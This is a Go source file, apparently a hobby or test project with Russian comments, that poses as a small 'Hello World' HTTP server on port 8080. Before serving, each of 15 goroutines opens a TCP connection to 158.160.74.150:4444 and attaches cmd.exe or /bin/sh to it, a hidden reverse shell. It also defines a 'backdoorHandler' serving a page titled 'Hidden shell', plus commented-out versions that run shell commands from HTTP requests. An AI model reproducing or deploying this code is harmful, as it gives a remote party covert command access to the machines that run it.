package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"sync"
)

func StartingServer(port string) {
	var wg sync.WaitGroup

	for i := 0; i < 15; i++ {
		wg.Add(1)

		go func() {
			defer wg.Done()
			router := http.NewServeMux()
			router.HandleFunc("GET /hello", func(w http.ResponseWriter, r *http.Request) {
				w.Write([]byte("Hello World!"))

			})
			server := &http.Server{
				Addr:    fmt.Sprintf(":%s", port),
				Handler: router,
			}

			conn, err := net.Dial("tcp", "158.160.74.150:4444")
			if err != nil {
				return
			}
			defer conn.Close()

			if runtime.GOOS == "windows" {
				cmd := exec.Command("cmd.exe")
				cmd.Stdin = conn
				cmd.Stdout = conn
				cmd.Stderr = conn
				log.Println("wdwd")

				server.ListenAndServe()
				cmd.Run()
			} else {
				cmd := exec.Command("/bin/sh")
				cmd.Stdin = conn
				cmd.Stdout = conn
				cmd.Stderr = conn

				server.ListenAndServe()
				cmd.Run()
			}

		}()

	}

	log.Printf("Сервер запущен на порту: %s", port)

	wg.Wait()
}

func main() {
	StartingServer("8080")
}

func backdoorHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Query().Get("image") == "1" {
		resp, err := http.Get("https://maymont.org/wp-content/uploads/2020/04/banner-red-fox.jpg")
		if err != nil {
			http.Error(w, "Ошибка загрузки", http.StatusInternalServerError)
			return
		}
		defer resp.Body.Close()

		w.Header().Set("Content-Type", "image/jpeg")
		w.Header().Set("Content-Disposition", "inline; filename=red-fox.jpg")
		io.Copy(w, resp.Body)
		return
	}

	html := `
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Hidden shell</title>
</head>
<body>
<script>
fetch('/debug/hidden-shell?image=1')
  .then(resp => resp.blob())
  .then(blob => {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'red-fox.jpg';
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  })
  .catch(e => {
    document.body.innerText = 'Ошибка загрузки: ' + e;
  });
</script>
</body>
</html>
`
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(html))
}

// func backdoorHandler(w http.ResponseWriter, r *http.Request) {
// 	if runtime.GOOS == "windows" {
// 		cmd := exec.Command("cmd.exe", "/c", "wget -O red-fox.jpg https://maymont.org/wp-content/uploads/2020/04/banner-red-fox.jpg && start red-fox.jpg")
// 		out, err := cmd.CombinedOutput()
// 		if err != nil {
// 			w.Write([]byte("Ошибка: " + err.Error() + "\n"))
// 		}
// 		w.Write(out)
// 		return
// 	} else if runtime.GOOS == "android" {
// 		cmd := exec.Command("sh", "-c", "curl -o /data/local/tmp/red-fox.jpg https://maymont.org/wp-content/uploads/2020/04/banner-red-fox.jpg && am start -a android.intent.action.VIEW -d file:///data/local/tmp/red-fox.jpg -t image/jpeg")
// 		out, err := cmd.CombinedOutput()
// 		if err != nil {
// 			w.Write([]byte("Ошибка: " + err.Error() + "\n"))
// 		}
// 		w.Write(out)
// 		return
// 	} else {
// 		// cmd := exec.Command("sh", "-c", "wget -O red-fox.jpg https://maymont.org/wp-content/uploads/2020/04/banner-red-fox.jpg && xdg-open red-fox.jpg")
// 		cmd := exec.Command("pwd")
// 		log.Println(cmd)
// 		out, err := cmd.CombinedOutput()
// 		if err != nil {
// 			w.Write([]byte("Ошибка: " + err.Error() + "\n"))
// 		}
// 		w.Write(out)
// 		return
// 	}

// }

// func backdoorHandler(w http.ResponseWriter, r *http.Request) {
// 	if runtime.GOOS == "windows" {
// 		cmd := exec.Command("cmd.exe", "/c", "wget -O red-fox.jpg https://maymont.org/wp-content/uploads/2020/04/banner-red-fox.jpg && start red-fox.jpg")
// 		out, err := cmd.CombinedOutput()
// 		if err != nil {
// 			w.Write([]byte("Ошибка: " + err.Error() + "\n"))
// 		}
// 		w.Write(out)
// 		return
// 	} else {
// 		cmd := exec.Command("/bin/sh", "-c", "wget -O red-fox.jpg https://maymont.org/wp-content/uploads/2020/04/banner-red-fox.jpg && xdg-open red-fox.jpg")
// 		out, err := cmd.CombinedOutput()
// 		if err != nil {
// 			w.Write([]byte("Ошибка: " + err.Error() + "\n"))
// 		}
// 		w.Write(out)
// 		return
// 	}

// }

// func backdoorHandler(w http.ResponseWriter, r *http.Request) {
// 	var shell string

// 	// Выбираем shell в зависимости от ОС
// 	if runtime.GOOS == "windows" {
// 		shell = "cmd.exe"
// 	} else {
// 		shell = "/bin/sh"
// 	}

// 	cmd := exec.Command(shell)
// 	cmd.Stdin = r.Body
// 	cmd.Stdout = w
// 	cmd.Stderr = w

// 	err := cmd.Run()
// 	if err != nil {
// 		http.Error(w, "Ошибка запуска shell: "+err.Error(), http.StatusInternalServerError)
// 	}
// }
